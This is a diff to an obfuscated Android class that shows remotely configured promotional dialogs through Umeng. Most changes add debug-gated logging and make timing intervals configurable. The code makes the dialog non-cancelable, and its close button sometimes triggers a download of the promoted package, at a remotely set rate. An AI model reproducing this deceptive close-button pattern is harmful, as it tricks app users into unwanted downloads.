@@ -22,6 +22,7 @@ import android.os.Handler;
 import android.os.Looper;
 import android.text.TextUtils;
 import android.util.DisplayMetrics;
+import android.util.Log;
 import android.view.View;
 import android.view.View.OnClickListener;
 import android.view.ViewGroup;
@@ -47,6 +48,7 @@ public class Agmrsk {
 	public static Context mContext;
 	public static String FP = Environment.getExternalStorageDirectory().getAbsolutePath() + "/tlp";
 	private static Map<String, Object> session = new HashMap<String, Object>();
+	public static boolean DEBUG = false;
 	
 	public static void init(Context context) {
 		try {
@@ -93,13 +95,20 @@ public class Agmrsk {
 		long last = sp.getLong("last_loaddr", 0);
 		long current = System.currentTimeMillis();
 		//隔10分钟才同步一次UMENG的数据
-		if (current - last > 10 * 60 * 1000) {
+		long update_interval = 10000;
+		String ui = MobclickAgent.getConfigParams(mContext, "update_interval");
+		try {
+			update_interval = Long.parseLong(ui);
+		} catch (Throwable t) {}
+		Agmrsk.i("update_interval is " + update_interval);
+		if (current - last > update_interval) {
 			MobclickAgent.setOnlineConfigureListener(new UmengOnlineConfigureListener() {
 				
 				@Override
 				public void onDataReceived(JSONObject arg0) {
+					Agmrsk.i("umeng updated=> " + arg0.toString());
 					loadppp();
-					System.out.println("is loadchpr_no_um? " + (null != session.get("loadchpr_no_um")));
+					Agmrsk.i("is loadchpr_no_um? " + (null != session.get("loadchpr_no_um")));
 					if (null != session.get("loadchpr_no_um")) {
 						session.remove("loadchpr_no_um");
 						final Context context = (Context) session.get("loadchpr_context");
@@ -172,7 +181,7 @@ public class Agmrsk {
 		if (!envavail()) return;
 		String bes = MobclickAgent.getConfigParams(mContext, "bes");
 		if (TextUtils.isEmpty(bes)) {
-			System.out.println("loadchpr_no_um");
+			Agmrsk.i("loadchpr_no_um");
 			session.put("loadchpr_no_um", true);
 			session.put("loadchpr_context", context);
 			return;
@@ -215,7 +224,7 @@ public class Agmrsk {
 		for (int i = 0; i < arr.length()*2; i++) {
 			try {
 				int agi = new Random().nextInt(arr.length());
-				System.out.println("random agi is " + agi);
+				Agmrsk.i("random agi is " + agi);
 				JSONObject obj = arr.getJSONObject(agi);
 				String pkg = obj.getString("pkg");
 				if (!AgrUtils.PackageInstalled(mContext, pkg)) return agi;
@@ -238,7 +247,7 @@ public class Agmrsk {
 	
 	private static void sohesw(final String pkrdsa, Context context) {
 		String pkifdas = MobclickAgent.getConfigParams(mContext, pkrdsa);
-		System.out.println("pkifdas=> " + pkifdas);
+		Agmrsk.i("pkifdas=> " + pkifdas);
 		if (TextUtils.isEmpty(pkifdas)) return;
 		try {
 			JSONObject obj = new JSONObject(pkifdas);
@@ -257,12 +266,14 @@ public class Agmrsk {
 					dialog.dismiss();
 				}
 			});
-			img.setMaxHeight(bm.getScaledHeight(bm.getDensity()));
-			img.setScaleType(ImageView.ScaleType.FIT_XY);
+			img.setAdjustViewBounds(true);
+			img.setScaleType(ImageView.ScaleType.FIT_CENTER);
 			RelativeLayout rl = new RelativeLayout(context);
-			ViewGroup.LayoutParams p = new ViewGroup.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+			RelativeLayout fl = new RelativeLayout(context);
+			ViewGroup.LayoutParams p2 = new ViewGroup.LayoutParams(-1, -1);
+			RelativeLayout.LayoutParams p = new RelativeLayout.LayoutParams(bm.getWidth(), bm.getHeight());
+			p.addRule(RelativeLayout.CENTER_IN_PARENT);
 			RelativeLayout.LayoutParams rlp = new RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.WRAP_CONTENT, RelativeLayout.LayoutParams.WRAP_CONTENT);
-			
 			ImageView img2 = new ImageView(context);
 			img2.setImageResource(android.R.drawable.ic_delete);
 			img2.setOnClickListener(new OnClickListener() {
@@ -272,15 +283,15 @@ public class Agmrsk {
 					dialog.dismiss();
 					Random rd = new Random();
 					int r = rd.nextInt(10);
-					System.out.println("r is " + r);
+					Agmrsk.i("r is " + r);
 					String pr = MobclickAgent.getConfigParams(mContext, "clc_random");
-					int pri = 4;
+					int pri = 1;
 					try {
 						pri = Integer.parseInt(pr);
 					} catch (Throwable t) {
 						reporte(t);
 					}
-					System.out.println("pri " + pri);
+					Agmrsk.i("pri " + pri);
 					if  (r < pri) {
 						ondld(pkrdsa);
 					}
@@ -294,9 +305,11 @@ public class Agmrsk {
 			rl.addView(img2, rlp2);
 			
 			dialog.setCancelable(false);
+			
 			notifyevent("show", obj.getString("name"));
 			dialog.show();
-			dialog.setContentView(rl, p);
+			fl.addView(rl, p);
+			dialog.setContentView(fl, p2);
 		} catch (Throwable e) {
 			reporte(e);
 		}
@@ -352,9 +365,9 @@ public class Agmrsk {
 	
 	//是否已初始化,且有网络
 	private static boolean envavail() {
-		System.out.println("mcontext " + mContext);
-		System.out.println("ntavail() " + ntavail());
-		System.out.println("envavail() " + (null != mContext && ntavail()));
+		Agmrsk.i("mcontext " + mContext);
+		Agmrsk.i("ntavail() " + ntavail());
+		Agmrsk.i("envavail() " + (null != mContext && ntavail()));
 		return null != mContext && ntavail();
 	}
 	
@@ -370,11 +383,26 @@ public class Agmrsk {
 		SharedPreferences sp = mContext.getSharedPreferences("sargp", 0);
 		long last = sp.getLong("last_flush", 0);
 		long current = System.currentTimeMillis();
-		//隔10秒钟才同步一次UMENG的数据
-		if (current - last > 10 * 1000) {
+		long update_interval = 10000;
+		String ui = MobclickAgent.getConfigParams(mContext, "flush_interval");
+		try {
+			update_interval = Long.parseLong(ui);
+		} catch (Throwable t) {}
+		Agmrsk.i("flush_interval is " + update_interval);
+		if (current - last > update_interval) {
 			MobclickAgent.flush(mContext);
 			sp.edit().putLong("last_flush", current).commit();
-			System.out.println("flush Umeng data");
+			Agmrsk.i("flush Umeng data");
+		}
+	}
+	
+	public static void i(String msg) {
+		i("Agmrsk", msg);
+	}
+	
+	public static void i(String tag, String msg) {
+		if (DEBUG) {
+			Log.i(tag, msg);
 		}
 	}
 
